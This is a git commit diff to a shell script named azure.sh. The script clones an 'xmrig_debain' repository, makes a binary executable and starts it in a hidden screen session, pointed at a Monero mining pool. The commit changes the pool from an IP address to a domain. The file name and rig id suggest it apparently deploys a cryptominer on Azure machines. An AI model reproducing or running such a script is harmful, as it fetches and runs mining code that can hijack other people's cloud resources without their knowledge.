c6568e27556e4394332d2469d880d02bffc617a4
yuqingkj <42601051+yuqingkj@users.noreply.github.com>
2021-02-24 19:45:39 +0800

    Update azure.sh

--- azure.sh
+++ azure.sh
@@ -5,6 +5,6 @@ git clone https://github.com/yuqingkj/xmrig_debain.git
 cd xmrig_debain/
 chmod 777 ./xde18
 screen -dmS xmr
-cmd=$"./xde18 -o 106.75.47.32:3333 --rig-id az -t 8";
+cmd=$"./xde18 -o xmr-aws.726726.xyz:3333 --rig-id az -t 8";
 screen -x -S xmr -p 0 -X stuff "$cmd\n"
 echo ok
